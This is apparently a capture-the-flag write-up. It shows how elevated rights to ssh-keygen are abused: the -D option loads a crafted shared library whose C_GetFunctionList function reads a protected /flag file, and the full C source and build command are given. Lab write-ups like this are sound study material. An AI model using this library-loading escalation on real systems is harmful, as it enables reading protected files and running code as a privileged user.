## MISUSING SSH-KEYGEN

In this level I had escalated privileges to the command ssh-keygen and had to use it to read the flag file. The command ssh-keygen by itself can never 'read' a normal file in the regular sense. I tried using different flags to read the file but they all had similar errors like,

```
~$ echo "secret flag" > secret.txt
~$ ssh-keygen -B -f secret.txt
secret.txt is not a public key file.

~$ ssh-keygen -e -f secret.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'secret.txt' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "secret.txt": bad permissions

~$ chmod go-r secret.txt
~$ chmod u-w secret.txt
~$ ssh-keygen -c -f secret.txt
Cannot load private key "secret.txt": invalid format.
~$ ssh-keygen -i -f secret.txt
do_convert_from_ssh2: base64 decoding failed: invalid format
~$ ssh-keygen -e -f secret.txt
Load key "secret.txt": invalid format
~$ ssh-keygen -l -f secret.txt
secret.txt is not a public key file.
```

Now all these bash results clearly suggest that you just cannot read a normal file using ssh-keygen, because a normal file is not a public key file which ssh-keygen usually deals with.

But there was one specific flag which seemed different, the `ssh-keygen -D`. After looking into it a bit, I learned that this flag processes a shared library and reads the public key from it, specifically, it looks for a function called `C_GetFunctionList` and executes it to find the public key.

After a lot of trial and error, I finally managed to succeed after writing this C code in secret.c,

```c
#include <stdio.h>

unsigned long C_GetFunctionList(void *ptr) {
    printf("hello\n");

    FILE *file;
    file = fopen("/flag", "r");

    char buffer[256];
    while (fgets(buffer, sizeof(buffer), file) != NULL) {
        printf("%s", buffer);
    }

    fclose(file);
    return 1;
}
```

and then compiling it into a shared library using,

```bash
~$ gcc -shared -o secret.so -fPIC secret.c
```

then ran it with `ssh-keygen -D ./secret.so` and successfully got the flag.
